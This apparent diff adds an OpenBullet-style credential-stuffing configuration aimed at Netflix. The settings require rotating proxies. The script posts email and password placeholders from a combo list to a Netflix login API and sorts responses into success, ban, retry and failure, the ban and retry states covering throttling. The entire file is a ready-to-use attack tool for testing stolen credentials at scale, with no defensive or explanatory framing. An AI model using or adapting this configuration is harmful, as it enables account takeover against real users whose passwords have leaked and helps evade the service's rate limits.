@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Netflix (Train)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-19T01:29:12.6349441+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api-global.netflix.com/iosui/user/9.0" AutoRedirect=TRUE 
+  CONTENT "appInternalVersion=9.0.0&appVersion=9.0.0&callPath=[\"moneyball\",\"appleSignUp\",\"next\"]&device_type=NFAPPL-02-&idiom=phone&iosVersion=11.3&isTablet=false&kids=false&maxDeviceWidth=320&method=call&model=saget&modelType=IPHONE8-4&odpAware=true&param={\"action\":\"loginAction\",\"fields\":{\"email\":\"<USER>\",\"rememberMe\":\"true\",\"password\":\"<PASS>\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Argo/9.0.2 (iPhone; iOS 11.3; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"mode\":\"memberHome\"" 
+  KEYCHAIN Ban AND 
+    KEY "throttling_failure" 
+    KEY "\"mode\":\"login\"" 
+  KEYCHAIN Failure AND 
+    KEY "<SOURCE>" DoesNotContain "throttling_failure" 
+    KEY "\"mode\":\"login\"" 
+  KEYCHAIN Retry OR 
+    KEY "postDyscom" 
